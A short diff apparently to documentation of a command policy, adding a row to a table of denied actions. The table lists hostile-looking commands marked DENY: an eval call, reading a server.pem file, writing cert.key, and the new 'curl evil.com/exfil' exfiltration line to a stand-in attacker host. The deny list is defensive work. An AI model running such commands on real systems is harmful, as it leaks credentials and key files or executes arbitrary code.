@@ -143,6 +143,7 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 | 24 | `__builtins__.eval('print("pwned")')` | DENY |
 | 25 | `cat server.pem` | DENY |
 | 26 | `open('cert.key', 'w')` | DENY |
+| 27 | `curl evil.com/exfil` | DENY |
 
 ## 与其他组件的关系
 
